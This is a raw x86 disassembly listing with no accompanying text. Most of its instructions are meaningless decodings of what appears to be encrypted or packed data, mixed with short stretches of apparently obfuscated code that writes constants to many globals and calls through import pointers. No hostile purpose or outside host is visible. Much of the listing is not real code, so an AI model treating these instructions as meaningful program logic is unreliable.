  402ad3:	add    eax,0xb5c9c7ec
  402ad8:	out    dx,eax
  402ad9:	adc    eax,0xd35827
  402ade:	iret   
  402adf:	test   ebp,edx
  402ae1:	sbb    BYTE PTR [edx],cl
  402ae3:	fmul   DWORD PTR [ebx]
  402ae5:	jnp    0x402aed
  402ae7:	cmp    dl,ah
  402ae9:	in     eax,dx
  402aea:	xor    DWORD PTR [ebx-0x37],ebp
  402aed:	cmp    al,0x3f
  402aef:	mov    ds:0xf615820b,al
  402af4:	jg     0x402a96
  402af6:	mov    esi,0x5d3eb632
  402afb:	jo     0x402b4c
  402afd:	rol    DWORD PTR [esi-0x1dabe6d5],0x8
  402b04:	dec    esp
  402b05:	inc    DWORD PTR [eax]
  402b07:	add    edx,ebx
  402b09:	jae    0x402aea
  402b0b:	std    
  402b0c:	loop   0x402b04
  402b0e:	and    DWORD PTR [edi-0x35eafa67],esi
  402b14:	clc    
  402b15:	sbb    eax,0xf2586a48
  402b1a:	add    bl,BYTE PTR [esi+eiz*1]
  402b1d:	icebp  
  402b1e:	mov    dl,0x2
  402b20:	xchg   esi,eax
  402b21:	mov    eax,ds:0xaf8d2863
  402b26:	mov    ch,0x5b
  402b28:	pop    edi
  402b29:	jmp    0x402adc
  402b2b:	jmp    0x402af1
  402b2d:	(bad)  
  402b2e:	or     al,0x88
  402b30:	mov    DWORD PTR [edi+0x52d0ceaf],0x723abe06
  402b3a:	addr16 mov ebx,0xce65c235
  402b40:	jnp    0x402b94
  402b42:	stos   BYTE PTR es:[edi],al
  402b43:	retf   0x6f1
  402b46:	dec    edi
  402b47:	xlat   BYTE PTR ds:[ebx]
  402b48:	aaa    
  402b49:	xchg   DWORD PTR [edx+0x33f96379],ecx
  402b4f:	inc    ebx
  402b50:	mov    bl,0xf4
  402b52:	dec    ebp
  402b53:	mov    ah,0x28
  402b55:	sub    DWORD PTR [edi-0x1a],esi
  402b58:	sar    ebx,1
  402b5a:	in     eax,dx
  402b5b:	cmp    dh,ch
  402b5d:	xchg   edi,eax
  402b5e:	and    al,BYTE PTR [ebp-0x3d55382f]
  402b64:	push   esi
  402b65:	jl     0x402b58
  402b67:	sub    ebp,DWORD PTR [ebp+0x685051a5]
  402b6d:	fisttp WORD PTR ds:0x1d810000
  402b73:	out    0x83,eax
  402b75:	inc    edx
  402b76:	add    al,ah
  402b78:	inc    ecx
  402b79:	add    BYTE PTR [eax],al
  402b7b:	push   0x2d0f
  402b80:	call   0x4220b4
  402b85:	mov    ecx,DWORD PTR [ebp-0x68]
  402b88:	not    edx
  402b8a:	mov    edx,DWORD PTR [ebp-0x64]
  402b8d:	cmp    DWORD PTR ds:0x4282d3,0x0
  402b94:	mov    edx,DWORD PTR ds:0x4283e7
  402b9a:	mov    DWORD PTR ds:0x4281df,0x2873
  402ba4:	movzx  edx,WORD PTR ds:0x428283
  402bab:	jmp    0x402c06
  402bb0:	mov    DWORD PTR ds:0x42835b,ebx
  402bb6:	cmp    DWORD PTR ds:0x4282d3,0x0
  402bbd:	jb     0x402be8
  402bc3:	push   DWORD PTR [ebp-0x1c]
  402bc6:	call   DWORD PTR ds:0x428dd4
  402bcc:	mov    edx,DWORD PTR ds:0x4282e3
  402bd2:	add    DWORD PTR ds:0x4282bb,edx
  402bd8:	mov    DWORD PTR ds:0x42835f,0x7648
  402be2:	adc    edx,DWORD PTR ds:0x42829b
  402be8:	mov    edx,DWORD PTR ds:0x42836b
  402bee:	sbb    DWORD PTR ds:0x4282f7,edx
  402bf4:	mov    edx,DWORD PTR ds:0x4282b3
  402bfa:	xor    DWORD PTR ds:0x428377,edx
  402c00:	and    edx,DWORD PTR ds:0x42834f
  402c06:	xor    eax,ecx
  402c08:	mov    ecx,DWORD PTR [ebp-0x70]
  402c0b:	xor    edx,0x594e
  402c11:	mov    edx,DWORD PTR [ebp-0x6c]
  402c14:	add    DWORD PTR ds:0x42827b,0x7b5b
  402c1e:	sub    eax,ecx
  402c20:	mov    ecx,DWORD PTR ds:0x428223
  402c26:	mov    ecx,DWORD PTR [ecx]
  402c28:	and    DWORD PTR ds:0x4282ab,ecx
  402c2e:	mov    ecx,DWORD PTR ds:0x4225d8
  402c34:	or     DWORD PTR ds:0x4281a3,0x509d
  402c3e:	lea    eax,[eax+ecx*1-0x27d2]
  402c45:	mov    ecx,DWORD PTR [ebp-0x1c]
  402c48:	mov    edx,DWORD PTR [ebp-0x2c]
  402c4b:	sbb    DWORD PTR ds:0x42834b,0x9f0
  402c55:	or     ecx,0x4f00
  402c5b:	add    DWORD PTR ds:0x4283df,0x4283bb
  402c65:	jmp    0x403043
  402c6a:	nop
  402c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c6c:	(bad)  
  402c6d:	call   0x1caec68c
  402c72:	int    0x3e
  402c74:	cmp    DWORD PTR [ecx+ebx*4-0x16],0x8
  402c79:	push   0xffffffb6
  402c7b:	hlt    
  402c7c:	sbb    BYTE PTR [eax],bl
  402c7e:	sahf   
  402c7f:	adc    bl,BYTE PTR [eax]
  402c81:	sbb    BYTE PTR [esi-0x72d72e6e],bh
  402c87:	and    bh,BYTE PTR [ebx-0x771c554f]
  402c8d:	mov    al,ds:0xc3476730
  402c92:	test   DWORD PTR [ebx+0x3a],esp
  402c95:	pop    ss
  402c96:	pop    ebx
  402c97:	mov    al,0x14
  402c99:	cmp    eax,0xfeff6df2
  402c9e:	mov    ch,0xc6
  402ca0:	sbb    eax,0x690ee3fc
  402ca5:	push   ebx
  402ca6:	xchg   BYTE PTR [edi-0x38ce4eb1],cl
  402cac:	gs popa 
  402cae:	pop    es
  402caf:	arpl   bp,si
  402cb1:	push   ebp
  402cb2:	or     ah,BYTE PTR [ebx+0x17]
  402cb5:	aad    0x76
  402cb7:	xchg   ebp,eax
  402cb8:	repz pop es
  402cba:	add    BYTE PTR [edx*8+0x93d3de3],bh
  402cc1:	popa   
  402cc2:	mov    edx,DWORD PTR [eax+eax*1+0x62]
  402cc6:	jne    0x402c69
  402cc8:	sahf   
  402cc9:	(bad)  
  402cca:	mov    edx,0x31d4b5d
  402ccf:	ret    
  402cd0:	sbb    bl,BYTE PTR [eax+0x2b9ad6c]
  402cd6:	je     0x402d0a
  402cd8:	pop    ebp
  402cd9:	fidivr DWORD PTR [edx]
  402cdb:	jl     0x402cea
  402cdd:	sahf   
  402cde:	inc    ebx
  402cdf:	mov    edx,0x194dc040
  402ce4:	jns    0x402cbc
  402ce6:	sub    bl,BYTE PTR [edi-0x52d0d433]
  402cec:	sbb    al,0xc2
  402cee:	ds mov ecx,0x33474eef
  402cf4:	scas   al,BYTE PTR es:[edi]
  402cf5:	xchg   esi,eax
  402cf6:	inc    ebp
  402cf7:	sub    DWORD PTR ds:0x90749ffb,eax
  402cfd:	jmp    0x402d76
  402cff:	test   eax,0xe03df610
  402d04:	add    cl,dh
  402d06:	enter  0x292,0xf7
  402d0a:	inc    ecx
  402d0b:	cli    
  402d0c:	stos   BYTE PTR es:[edi],al
  402d0d:	iret   
  402d0e:	rcl    DWORD PTR [edx-0x4d],0x24
  402d12:	sub    al,0x3d
  402d14:	xchg   dh,ah
  402d16:	shl    DWORD PTR [ecx],cl
  402d18:	pop    esp
  402d19:	lods   al,BYTE PTR ds:[esi]
  402d1a:	jmp    0xb990bac0
  402d1f:	clc    
  402d20:	in     eax,dx
  402d21:	out    0xd0,al
  402d23:	cmp    BYTE PTR [ebp+0x5c0734ea],bh
  402d29:	inc    ecx
  402d2a:	popf   
  402d2b:	or     eax,0xe9da7a6
  402d30:	pop    esi
  402d31:	outs   dx,DWORD PTR ds:[esi]
  402d32:	pop    ss
  402d33:	lods   al,BYTE PTR gs:[esi]
  402d35:	not    DWORD PTR [ebx+0x50]
  402d38:	or     ebp,DWORD PTR [esi]
  402d3a:	mov    ds:0xb84c3450,al
  402d3f:	hlt    
  402d40:	xor    eax,ecx
  402d42:	dec    ecx
  402d43:	xchg   edx,eax
  402d44:	aas    
  402d45:	add    edx,DWORD PTR gs:[ecx-0x6f]
  402d49:	sub    BYTE PTR [bx+si+0x3c3d],cl
  402d4e:	sbb    ebx,edi
  402d50:	or     eax,DWORD PTR [edx+0x4619ddc1]
  402d56:	pop    ss
  402d57:	or     DWORD PTR [ecx],esp
  402d59:	rcr    DWORD PTR [edi],1
  402d5b:	sub    edi,DWORD PTR [ebp+0xb]
  402d5e:	and    ecx,DWORD PTR [edx-0x34466a47]
  402d64:	xor    DWORD PTR [ebx+0x3f7ba999],esi
  402d6a:	in     eax,0x55
  402d6c:	bound  edx,QWORD PTR [edx+0x5e]
  402d6f:	jbe    0x402d9c
  402d71:	jmp    0x325b:0x36efcb22
  402d78:	out    dx,eax
  402d79:	and    DWORD PTR [ebp+ebp*1-0x3cdbffad],esp
  402d80:	data16 xlat BYTE PTR ds:[ebx]
  402d82:	mov    bh,bh
  402d84:	mov    cl,0x84
  402d86:	data16 arpl WORD PTR [edi+0x3ac54274],cx
  402d8d:	jle    0x402d1a
  402d8f:	aam    0xea
  402d91:	push   ds
  402d92:	dec    esp
  402d93:	cmp    dl,dh
  402d95:	jb     0x402d6c
  402d97:	fild   WORD PTR [ebx+0x20caee9a]
  402d9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d9e:	jp     0x402dac
  402da0:	or     ah,0x82
  402da3:	pop    DWORD PTR [edi-0x31ddf811]
  402da9:	in     al,0x72
  402dab:	inc    ebp
  402dac:	add    edx,DWORD PTR [ebp-0x3b]
  402daf:	sub    BYTE PTR [ebp-0x12],ch
  402db2:	aas    
  402db3:	mov    ebx,0x474ce9aa
  402db8:	ret    0xd435
  402dbb:	scas   eax,DWORD PTR es:[edi]
  402dbc:	sahf   
  402dbd:	add    al,dl
  402dbf:	mov    edx,0xe8f57d76
  402dc4:	push   ss
  402dc5:	fs sub esi,ebp
  402dc8:	and    bl,BYTE PTR [ebx]
  402dca:	mov    cl,0x99
  402dcc:	mov    al,0x42
  402dce:	or     dh,BYTE PTR [eax+edx*8+0x56]
  402dd2:	dec    edi
  402dd3:	ror    DWORD PTR ds:0xb76b9040,1
  402dd9:	pop    edx
  402dda:	or     BYTE PTR [edx+0x68202038],dh
  402de0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402de1:	adc    ebp,ecx
  402de3:	jmp    0x911cc156
  402de8:	into   
  402de9:	xor    BYTE PTR [edi+0x63],bh
  402dec:	je     0x402e39
  402dee:	sbb    eax,0xba8dcbfe
  402df3:	std    
  402df4:	inc    edi
  402df5:	imul   edi,DWORD PTR [ebp+0x2d],0x8dae8d49
  402dfc:	in     eax,0xf5
  402dfe:	jle    0x402e3f
  402e00:	pushf  
  402e01:	push   edi
  402e02:	ss popf 
  402e04:	pop    esp
  402e05:	repz mov ebx,ebp
  402e08:	jmp    0x73ac:0xcd5281ae
  402e0f:	ss stos DWORD PTR es:[edi],eax
  402e11:	add    DWORD PTR [ebx],edx
  402e13:	cli    
  402e14:	cmp    DWORD PTR [ecx-0x61],eax
  402e17:	dec    ebp
  402e18:	dec    ecx
  402e19:	out    dx,al
  402e1a:	outs   dx,DWORD PTR ds:[esi]
  402e1b:	push   0x2c
  402e1d:	loopne 0x402de7
  402e1f:	(bad)
  402e22:	in     al,0xdd
  402e24:	mov    dl,0xcf
  402e26:	inc    edx
  402e27:	xchg   ecx,eax
  402e28:	stos   DWORD PTR es:[edi],eax
  402e29:	out    0xc9,eax
  402e2b:	das    
  402e2c:	dec    ecx
  402e2d:	mov    bl,BYTE PTR [ecx]
  402e2f:	mov    dl,0x52
  402e31:	or     eax,0x42c62f48
  402e36:	xchg   ebx,eax
  402e37:	and    DWORD PTR [esi+0x7d],edi
  402e3a:	cli    
  402e3b:	and    BYTE PTR [ebp+0x50],0xa6
  402e3f:	cdq    
  402e40:	push   ebx
  402e41:	cdq    
  402e42:	dec    esi
  402e43:	xor    cl,BYTE PTR [ecx*8+0x2ba98e4]
  402e4a:	arpl   di,bp
  402e4c:	and    al,0xac
  402e4e:	inc    esi
  402e4f:	jmp    0xddd5:0x479bc550
  402e56:	mov    cl,0x57
  402e58:	retf   
  402e59:	popf   
  402e5a:	loop   0x402e17
  402e5c:	and    DWORD PTR [edi-0x2390e925],0xffffff99
  402e63:	xor    BYTE PTR [eax+0x66665d73],bl
  402e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e6a:	xor    edi,DWORD PTR [ecx+0x31]
  402e6d:	pop    ecx
  402e6e:	xor    esi,DWORD PTR [edx]
  402e70:	mov    edx,0x792fe03a
  402e75:	cmp    eax,0xd71c8f8c
  402e7a:	pop    ds
  402e7b:	jg     0x402ecb
  402e7d:	lods   eax,DWORD PTR ds:[esi]
  402e7e:	punpckhbw mm0,QWORD PTR [edx+edi*1+0x3c]
  402e83:	mov    bh,0xd0
  402e85:	je     0x402ed3
  402e87:	inc    esi
  402e88:	mul    BYTE PTR [edx-0x4b]
  402e8b:	or     eax,0x6fc8dfeb
  402e90:	mov    ds:0x91e2ad1d,al
  402e95:	jb     0x402efd
  402e97:	jno    0x402f14
  402e99:	mov    eax,0x28067118
  402e9e:	sub    dh,dh
  402ea0:	and    BYTE PTR [esi+0x42],dl
  402ea3:	test   DWORD PTR [edi+ebp*2+0x4],0xb5312e48
  402eab:	or     al,0x2c
  402ead:	fnstsw WORD PTR [esp+ebx*1+0x6847afb6]
  402eb4:	jmp    0x31b50829
  402eb9:	inc    esp
  402eba:	mov    bl,0xfa
  402ebc:	pop    ecx
  402ebd:	push   eax
  402ebe:	sub    al,0xba
  402ec0:	mov    bh,0xd8
  402ec2:	cmp    BYTE PTR [ebx-0x28],bh
  402ec5:	ins    BYTE PTR es:[edi],dx
  402ec6:	in     al,dx
  402ec7:	xchg   ebx,eax
  402ec8:	inc    edi
  402ec9:	fdiv   QWORD PTR [ecx+0x3f]
  402ecc:	nop
  402ecd:	fwait
  402ece:	aas    
  402ecf:	adc    eax,DWORD PTR [esi+0x5bd1c7af]
  402ed5:	fisttp QWORD PTR [edi]
  402ed7:	test   DWORD PTR [esi+edx*4],esp
  402eda:	outs   dx,BYTE PTR ds:[esi]
  402edb:	mov    bh,0xcf
  402edd:	pop    ecx
  402ede:	dec    edx
  402edf:	pushf  
  402ee0:	aas    
  402ee1:	xchg   ebp,eax
  402ee2:	scas   al,BYTE PTR es:[edi]
  402ee3:	ss int3 
  402ee5:	xchg   edi,eax
  402ee6:	es in  al,0xc4
  402ee9:	(bad)  
  402eea:	ins    BYTE PTR es:[edi],dx
  402eeb:	(bad)  
  402eec:	test   DWORD PTR [eax+ebp*2-0x5043172b],0x11bdbcc0
  402ef7:	fstp   QWORD PTR ss:[ebp-0x2a30e104]
  402efe:	ds call 0x4689:0x5facb169
  402f06:	fnsave [edi+0x76]
  402f09:	cdq    
  402f0a:	sub    al,0x77
  402f0c:	push   edi
  402f0d:	rcl    BYTE PTR [ecx+0x4965776d],0x1
  402f14:	in     eax,dx
  402f15:	sub    dl,BYTE PTR [ebx-0x51a5d653]
  402f1b:	cwde   
  402f1c:	fwait
  402f1d:	lock in ax,dx
  402f20:	xor    esp,DWORD PTR [ebp-0x2c]
  402f23:	ss push ecx
  402f25:	sbb    DWORD PTR [eax+0x2a],edx
  402f28:	loop   0x402ef8
  402f2a:	sar    BYTE PTR [ecx+0x12],0x68
  402f2e:	jecxz  0x402f12
  402f30:	mov    ds:0x7878861d,eax
  402f35:	add    bl,cl
  402f37:	rol    BYTE PTR [ecx+0x70],cl
  402f3a:	fldenv ds:0x8f99e665
  402f40:	sahf   
  402f41:	inc    eax
  402f42:	dec    esp
  402f43:	out    0xa7,eax
  402f45:	jp     0x402f5c
  402f47:	rcr    DWORD PTR [edi+0x5309fb5c],cl
  402f4d:	adc    ebp,DWORD PTR [edx-0x79]
  402f50:	test   BYTE PTR [eax-0x5419106a],bl
  402f56:	mov    eax,ds:0x52f413a7
  402f5b:	jl     0x402eec
  402f5d:	xor    al,0xa5
  402f5f:	jmp    0xcd00:0xfe70289e
  402f66:	lods   eax,DWORD PTR ds:[esi]
  402f67:	add    eax,DWORD PTR [ebp+edx*2-0x579de37d]
  402f6e:	jecxz  0x402f03
  402f70:	sub    eax,0x42cdf1ca
  402f75:	xor    ebp,esi
  402f77:	cld    
  402f78:	mov    WORD PTR [ebx],cs
  402f7a:	fadd   st,st(6)
  402f7c:	data16 cmc 
  402f7e:	out    0xb9,al
  402f80:	(bad)  
  402f81:	push   cs
  402f82:	pop    ds
  402f83:	push   ebx
  402f84:	jmp    0xffe0c1bc
  402f89:	mov    esp,0x146cb668
  402f8e:	jns    0x402ffd
  402f90:	and    bh,al
  402f92:	mov    ebp,esp
  402f94:	jb     0x402f84
  402f96:	lods   al,BYTE PTR ds:[esi]
  402f97:	sbb    DWORD PTR [edi-0x796b950a],ebp
  402f9d:	sbb    dh,al
  402f9f:	cmp    ebp,DWORD PTR [eax-0x31]
  402fa2:	arpl   WORD PTR [eax+0x436a6bf1],ax
  402fa8:	jb     0x402f3d
  402faa:	jno    0x402fc0
  402fac:	pop    ebp
  402fad:	test   DWORD PTR [esi+eax*1],ebx
  402fb0:	add    DWORD PTR [edx+0x28],0xffffff9b
  402fb4:	sbb    edi,DWORD PTR [ebx+0x206c5d1c]
  402fba:	sub    ah,cl
  402fbc:	push   ebx
  402fbd:	cmp    al,0x36
  402fbf:	xchg   DWORD PTR [ebp+0x44],edi
  402fc2:	sub    BYTE PTR [ebx-0x6650efb0],dh
  402fc8:	add    al,BYTE PTR [ecx]
  402fca:	and    BYTE PTR ds:0x77fba215,dl
  402fd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fd1:	xchg   edi,eax
  402fd2:	cwde   
  402fd3:	sbb    BYTE PTR [ecx+0xfa868a3],al
  402fd9:	loope  0x403002
  402fdb:	sub    al,0x64
  402fdd:	or     eax,0x5e003720
  402fe2:	xor    BYTE PTR [edx],cl
  402fe4:	shr    BYTE PTR [ebx],1
  402fe6:	(bad)  
  402fe7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402fe8:	pop    ebp
  402fe9:	lods   al,BYTE PTR ds:[esi]
  402fea:	mov    ds,WORD PTR [eax+0x31]
  402fed:	gs dec esi
  402fef:	test   BYTE PTR [esi+ecx*8],ah
  402ff2:	mov    al,ds:0x49102f1c
  402ff7:	test   al,0xee
  402ff9:	cmp    ah,BYTE PTR [ebx+0x3ec2402a]
  402fff:	(bad)  
  403000:	jns    0x403029
  403002:	adc    al,0xd2
  403004:	es pop edx
  403006:	pushf  
  403007:	scas   eax,DWORD PTR es:[edi]
  403008:	mov    BYTE PTR [ebx],bh
  40300a:	sbb    al,0x7f
  40300c:	mov    WORD PTR [ebx],fs
  40300e:	pop    esi
  40300f:	out    0x23,al
  403011:	cmp    ebp,DWORD PTR [ecx+0x75]
  403014:	dec    edx
  403015:	or     bl,BYTE PTR [ecx-0x5d552877]
  40301b:	mul    bl
  40301d:	enter  0x2fe1,0x6a
  403021:	inc    ecx
  403022:	mov    cl,0xa3
  403024:	mov    bh,0xac
  403026:	ins    BYTE PTR es:[edi],dx
  403027:	fdecstp 
  403029:	xchg   al,dh
  40302b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40302c:	cmp    DWORD PTR [ebp+0x2e],ebx
  40302f:	inc    DWORD PTR [eax+0x19]
  403032:	mov    ch,0xd5
  403034:	lock xchg esi,eax
  403036:	jg     0x403034
  403038:	jnp    0x403088
  40303a:	cmp    eax,0xb591785
  40303f:	pop    eax
  403040:	call   0xca6386cd
  403045:	add    edx,0x3463
  40304b:	mov    edx,DWORD PTR [ebp-0x34]
  40304e:	or     ecx,edx
  403050:	xor    ecx,0x5fdd
  403056:	cmp    ecx,DWORD PTR [eax]
  403058:	mov    DWORD PTR ds:0x4282eb,0x665d
  403062:	jne    0x40a9b0
  403068:	mov    ecx,DWORD PTR [esi]
  40306a:	cmp    DWORD PTR ds:0x4283ef,0x0
  403071:	mov    DWORD PTR ds:0x4283f3,edx
  403077:	mov    DWORD PTR ds:0x42833b,0x1413
  403081:	mov    edx,DWORD PTR ds:0x4283e3
  403087:	jmp    0x4030db
  40308c:	mov    DWORD PTR ds:0x4281af,0x4beb
  403096:	not    eax
  403098:	cmp    DWORD PTR ds:0x4283ef,0x0
  40309f:	jl     0x4030c1
  4030a5:	push   DWORD PTR [ebp-0x20]
  4030a8:	push   DWORD PTR [ebp-0xc]
  4030ab:	call   DWORD PTR ds:0x428df4
  4030b1:	mov    DWORD PTR ds:0x42829b,0x4e29
  4030bb:	inc    DWORD PTR ds:0x4282bf
  4030c1:	or     edx,DWORD PTR ds:0x42835b
  4030c7:	add    edx,DWORD PTR ds:0x4281df
  4030cd:	sub    edx,edx
  4030cf:	add    DWORD PTR ds:0x4283e7,edx
  4030d5:	sbb    edx,DWORD PTR ds:0x42836f
  4030db:	mov    eax,DWORD PTR [esi+0x4]
  4030de:	sbb    edx,DWORD PTR ds:0x4283d3
  4030e4:	shrd   ecx,eax,0x2
  4030e8:	shr    eax,0x2
  4030eb:	mov    eax,DWORD PTR [esi]
  4030ed:	xor    DWORD PTR ds:0x4283f3,edx
  4030f3:	mov    edx,DWORD PTR [esi+0x4]
  4030f6:	neg    DWORD PTR ds:0x4281ab
  4030fc:	shl    eax,0x1e
  4030ff:	xor    ecx,edi
  403101:	xor    eax,eax
  403103:	sbb    DWORD PTR ds:0x4283f7,0x1e67
  40310d:	or     eax,ecx
  40310f:	jmp    0x4034ed
  403114:	and    al,0xd6
  403116:	push   esp
  403117:	repnz and dh,BYTE PTR [ebx+0x22]
  40311b:	inc    esi
  40311c:	sar    BYTE PTR [eax-0x73],1
  40311f:	jo     0x4030f7
  403121:	into   
  403122:	ret    
  403123:	jl     0x403162
  403125:	in     al,dx
  403126:	sbb    BYTE PTR [eax],bl
  403128:	sahf   
  403129:	adc    bl,BYTE PTR [eax]
  40312b:	sbb    bh,al
  40312d:	or     al,cl
  40312f:	loopne 0x40311c
  403131:	push   edi
  403132:	xchg   esp,eax
  403133:	jns    0x4030fc
  403135:	enter  0x16de,0x88
  403139:	xlat   BYTE PTR ds:[ebx]
  40313a:	mov    esi,0x4705ad3e
  40313f:	jle    0x4030de
  403141:	and    eax,0x7d54fb61
  403146:	jmp    0x16b55cfc
  40314b:	frstpm(287 only) 
  40314d:	sbb    DWORD PTR [ebx-0x3d],ecx
  403150:	mov    ah,0xa6
  403152:	jnp    0x4030d4
  403154:	sbb    bh,BYTE PTR [ecx]
  403156:	pop    esp
  403157:	push   es
  403158:	jecxz  0x4030e9
  40315a:	jmp    0x911dc6c1
  40315f:	(bad)  
  403160:	test   BYTE PTR [ebp+0x4f0223b7],dl
  403166:	mov    ecx,0xf2616407
  40316b:	inc    eax
  40316c:	cmp    BYTE PTR [edi-0x10],0x9d
  403170:	stos   DWORD PTR es:[edi],eax
  403171:	sbb    DWORD PTR [eax],eax
  403173:	pop    ds
  403174:	adc    ah,al
  403176:	das    
  403177:	inc    edi
  403178:	mov    DWORD PTR [ebp+0x546949cf],ebp
  40317e:	mov    ds:0x2654fa8c,eax
  403183:	jmp    0x81c0:0x50286a3f
  40318a:	pop    edx
  40318b:	mov    eax,0xc2298950
  403190:	icebp  
  403191:	pushf  
  403192:	mov    dh,cl
  403194:	scas   eax,DWORD PTR es:[edi]
  403195:	adc    edx,esp
  403197:	(bad)  
  403198:	sar    DWORD PTR [ebp-0x52e3ce02],cl
  40319e:	xchg   edi,eax
  40319f:	daa    
  4031a0:	or     edi,DWORD PTR [edi]
  4031a2:	sbb    ch,bh
  4031a4:	xor    BYTE PTR [edx+0xc],ah
  4031a7:	in     al,0x87
  4031a9:	jl     0x4031d0
  4031ab:	sbb    al,0xa6
  4031ad:	test   dh,dh
  4031af:	shr    DWORD PTR [eax+0x746d9e7e],0x4d
  4031b6:	inc    esi
  4031b7:	imul   edi,eax,0xb
  4031ba:	dec    edi
  4031bb:	mov    eax,ds:0xf3e16cb3
  4031c0:	xor    BYTE PTR ds:0xa02df2b8,al
  4031c6:	dec    ebx
  4031c7:	pop    edx
  4031c8:	cmc    
  4031c9:	add    bh,al
  4031cb:	fsub   DWORD PTR [eax-0x20]
  4031ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031cf:	add    ecx,ebp
  4031d1:	mov    al,ds:0x69b05b42
  4031d6:	xor    esp,DWORD PTR [edi]
  4031d8:	and    BYTE PTR [edi-0x19b4d33e],dl
  4031de:	add    bh,cl
  4031e0:	and    DWORD PTR [ebx+0x2],edx
  4031e3:	push   cs
  4031e4:	mov    ds:0x93170931,eax
  4031e9:	xchg   edx,eax
  4031ea:	xchg   ecx,eax
  4031eb:	xor    eax,ebx
  4031ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4031ee:	lds    ecx,FWORD PTR [ebx]
  4031f0:	(bad)  
  4031f2:	inc    edx
  4031f3:	add    eax,0xdfd6d4f0
  4031f8:	mov    eax,ds:0x651df72
  4031fd:	repz inc edi
  4031ff:	pusha  
  403200:	sbb    eax,0x4d1129f
  403205:	xchg   esi,eax
  403206:	xchg   ebx,eax
  403207:	adc    al,0xa5
  403209:	(bad)  
  40320a:	(bad)  
  40320b:	mov    ebp,0x16b92eb8
  403210:	add    DWORD PTR [esi+esi*2-0x21],edi
  403214:	jmp    0x866a518a
  403219:	dec    esp
  40321a:	fdiv   st(2),st
  40321c:	outs   dx,DWORD PTR ds:[esi]
  40321d:	jb     0x40324c
  40321f:	pop    ebx
  403220:	sub    DWORD PTR [edx+ebx*2+0x56],0x1afe2918
  403228:	add    bh,BYTE PTR [edx+0x577b1a75]
  40322e:	call   0xa0b7:0x2ec13a44
  403235:	out    dx,al
  403236:	frstor [esi+0x260f42dc]
  40323c:	ins    BYTE PTR es:[edi],dx
  40323d:	lods   eax,DWORD PTR ds:[esi]
  40323e:	add    eax,0xdd3120c4
  403243:	or     bh,BYTE PTR [ecx+0x55b78bd3]
  403249:	and    eax,0x3faabc3b
  40324e:	xor    BYTE PTR [ecx-0x1701dda9],cl
  403254:	jmp    0xb119:0xf0038bfd
  40325b:	(bad)  
  40325c:	push   edi
  40325d:	or     al,0xf7
  40325f:	cmp    al,0xec
  403261:	out    dx,al
  403262:	jbe    0x40320d
  403264:	xchg   esi,eax
  403265:	mov    WORD PTR [ecx+0x5ac2130b],cs
  40326b:	or     DWORD PTR fs:[edx],ebp
  40326e:	hlt    
  40326f:	mov    DWORD PTR [esi],ebx
  403271:	mov    dl,0xb4
  403273:	in     eax,0xc1
  403275:	push   ss
  403276:	lea    ecx,[eax+eax*2]
  403279:	xlat   BYTE PTR ds:[ebx]
  40327a:	ins    BYTE PTR es:[edi],dx
  40327b:	retf   
  40327c:	clc    
  40327d:	cmp    al,BYTE PTR [ecx]
  40327f:	xor    edi,ebp
  403281:	rcr    dl,cl
  403283:	pop    es
  403284:	cmp    al,0xf3
  403286:	outs   dx,DWORD PTR ds:[esi]
  403287:	xchg   BYTE PTR [edx+ecx*2+0x56],cl
  40328b:	cmc    
  40328c:	adc    eax,0x48890228
  403291:	test   ecx,ecx
  403293:	push   ebp
  403294:	and    edi,edi
  403296:	test   ecx,eax
  403298:	push   esi
  403299:	sbb    DWORD PTR [edx-0x6aa2b05c],esp
  40329f:	mov    ds:0x30b51aca,al
  4032a4:	bound  ecx,QWORD PTR [esi]
  4032a6:	and    ah,al
  4032a8:	stos   BYTE PTR es:[edi],al
  4032a9:	push   ecx
  4032aa:	mov    ecx,0x6a4e4507
  4032af:	(bad)  
  4032b0:	fdiv   DWORD PTR [ebx+esi*2-0x67]
  4032b4:	pop    ebx
  4032b5:	enter  0x10b6,0x97
  4032b9:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  4032bb:	mov    bh,dh
  4032bd:	xor    eax,DWORD PTR [ecx+0x4b]
  4032c0:	rol    esi,0x76
  4032c3:	in     al,dx
  4032c4:	jb     0x403312
  4032c6:	mov    al,0xe7
  4032c8:	int    0x47
  4032ca:	xchg   ecx,eax
  4032cb:	pusha  
  4032cc:	mov    esp,0xac68fd1d
  4032d1:	sbb    ecx,DWORD PTR [ebp-0xeab0793]
  4032d7:	mov    ch,0x44
  4032d9:	daa    
  4032da:	ss call 0x7a5eda93
  4032e0:	mov    ch,0x32
  4032e2:	dec    BYTE PTR [eax]
  4032e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032e5:	xor    eax,0xfdc37294
  4032ea:	sar    edx,cl
  4032ec:	push   edx
  4032ed:	push   edi
  4032ee:	mov    esi,0x54ff6177
  4032f3:	out    dx,al
  4032f4:	push   esp
  4032f5:	inc    edi
  4032f6:	ror    DWORD PTR [esi+0x6ea5e96],cl
  4032fc:	(bad)  
  4032fd:	mov    ah,0x6
  4032ff:	inc    ecx
  403300:	pop    eax
  403301:	repnz and cl,0x4f
  403305:	cli    
  403306:	jne    0x403288
  403308:	mov    bh,0x96
  40330a:	mov    dl,0x1c
  40330c:	iret   
  40330d:	rcr    eax,cl
  40330f:	inc    ebp
  403310:	icebp  
  403311:	mov    edi,0x73edde07
  403316:	cdq    
  403317:	jl     0x4032ba
  403319:	es mov ch,0x8b
  40331c:	dec    edi
  40331d:	mov    edx,0xe4bf11a
  403322:	sub    BYTE PTR [ebx-0x6f9d5f3e],al
  403328:	unpcklps xmm0,XMMWORD PTR [ecx+eax*1-0x67015006]
  403330:	into   
  403331:	add    eax,0x6a57e8d9
  403336:	ds mov eax,0xae0461f5
  40333c:	or     eax,0x8a6cdf0a
  403341:	pusha  
  403342:	(bad)  
  403343:	fdiv   QWORD PTR [eax]
  403345:	stos   BYTE PTR es:[edi],al
  403346:	adc    dl,BYTE PTR [edi]
  403348:	clc    
